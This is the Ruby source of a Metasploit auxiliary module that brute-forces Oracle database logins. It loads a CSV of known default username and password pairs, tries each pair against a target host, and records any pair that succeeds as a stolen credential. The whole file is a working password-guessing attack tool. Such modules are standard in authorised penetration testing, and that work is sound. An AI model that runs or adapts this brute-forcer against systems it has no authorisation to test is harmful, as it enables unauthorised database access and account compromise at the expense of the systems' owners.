##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'csv'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report
  include Msf::Exploit::ORACLE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle Account Discovery',
      'Description'    => %q{
        This module uses a list of well known default authentication credentials
        to discover easily guessed accounts.
      },
      'Author'         => [ 'MC' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.petefinnigan.com/default/oracle_default_passwords.csv' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2009/Oct/261' ],
        ],
      'DisclosureDate' => 'Nov 20 2008'))

      register_options(
        [
          OptPath.new('CSVFILE', [ false, 'The file that contains a list of default accounts.', File.join(Msf::Config.install_root, 'data', 'wordlists', 'oracle_default_passwords.csv')]),
        ])

      deregister_options('DBUSER','DBPASS')

  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL
    }.merge(service_data)

    create_credential_login(login_data)
  end

  def run
    return if not check_dependencies

    list = datastore['CSVFILE']

    print_status("Starting brute force on #{datastore['RHOST']}:#{datastore['RPORT']}...")

    fd = CSV.foreach(list) do |brute|
      datastore['DBUSER'] = brute[2].downcase
      datastore['DBPASS'] = brute[3].downcase

      begin
        connect
        disconnect
      rescue ::OCIError => e
        if e.to_s =~ /^ORA-12170:\s/
          print_error("#{datastore['RHOST']}:#{datastore['RPORT']} Connection timed out")
          break
        else
          vprint_error "#{datastore['RHOST']}:#{datastore['RPORT']} - LOGIN FAILED: #{datastore['DBUSER']}: #{e.to_s})"      
        end
      else
        report_cred(
          ip: datastore['RHOST'],
          port: datastore['RPORT'],
          service_name: 'oracle',
          user: "#{datastore['SID']}/#{datastore['DBUSER']}",
          password: datastore['DBPASS']
        )
        print_good("Found user/pass of: #{datastore['DBUSER']}/#{datastore['DBPASS']} on #{datastore['RHOST']} with sid #{datastore['SID']}")
      end
    end
  end
end
